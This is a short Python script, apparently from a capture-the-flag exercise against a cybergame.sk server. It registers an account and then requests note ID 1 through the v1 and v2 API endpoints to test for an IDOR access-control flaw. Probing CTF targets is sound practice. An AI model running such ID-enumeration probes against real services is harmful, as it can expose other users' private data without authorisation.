# The list only shows my note.
# What about reading a specific note by ID?
# Let's see if IDOR exists on `GET /api/v2/notes/1`?
# Earlier I got HTML when requesting `GET /api/v2/notes/1`.
# Let's check `GET /api/v1/notes/1` or `GET /api/v2/notes/1` but with the correct Accept header.
import requests

r_reg = requests.post("http://exp.cybergame.sk:7021/api/v2/register", json={"username": "admin2011", "password": "password"}, headers={"Content-Type": "application/json"})
token = r_reg.json().get("token")

r = requests.get("http://exp.cybergame.sk:7021/api/v2/notes/1", headers={"Authorization": f"Bearer {token}", "Accept": "application/json"})
print("v2 note 1:", r.status_code, r.text[:100])

r = requests.get("http://exp.cybergame.sk:7021/api/v1/notes/1", headers={"Authorization": f"Bearer {token}", "Accept": "application/json"})
print("v1 note 1:", r.status_code, r.text[:100])
